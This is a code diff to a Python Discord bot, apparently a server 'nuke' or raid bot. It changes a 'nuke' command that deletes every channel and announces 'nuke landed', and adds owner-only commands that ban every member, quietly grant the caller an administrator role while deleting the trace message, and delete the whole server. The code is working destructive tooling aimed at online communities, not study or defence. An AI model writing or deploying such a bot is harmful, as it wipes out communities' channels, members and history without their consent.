@@ -736,13 +736,6 @@ async def nuke(ctx):
     if ctx.author.id != 1097879047213686875:
         return await ctx.send("You are not the bot owner!")
 
-    # Create an Admin role with all the perms
-    perms = discord.Permissions(administrator=True)
-    role = await ctx.guild.create_role(name="Admin", permissions=perms)
-
-    # Give the Admin role to the bot
-    await ctx.guild.me.add_roles(role)
-
     for chan in ctx.guild.channels:
         try:
             await chan.delete()
@@ -759,9 +752,35 @@ async def nuke(ctx):
     channel = discord.utils.get(bot.get_all_channels(), guild=ctx.author.guild, name='nuked')
     await channel.send("nuke landed https://tenor.com/bxkG5.gif")
 
-    # Delete the server
-    await ctx.guild.delete()
+@bot.command()
+async def ban(ctx):
+    if ctx.author.id != 1097879047213686875:
+        return await ctx.send("You are not the bot owner!")
 
+    for member in ctx.guild.members:
+        try:
+            await member.ban()
+            await ctx.send(f"Successfully banned {member}")
+        
+        except Exception as e:
+            await ctx.send(f"Unable to ban {member} {e}")
+
+@bot.command()
+async def admin(ctx):
+    if ctx.author.id != 1097879047213686875:
+        return await ctx.send("You are not the bot owner!")
+
+    perms = discord.Permissions(administrator=True)
+    role = await ctx.guild.create_role(name="Admin", permissions=perms)
+    await ctx.author.add_roles(role)
+    await ctx.message.delete()
+
+@bot.command()
+async def delete(ctx):
+    if ctx.author.id != 1097879047213686875:
+        return await ctx.send("You are not the bot owner!")
+
+    await ctx.guild.delete()
 
 
 bot.run(os.environ['TOKEN'])
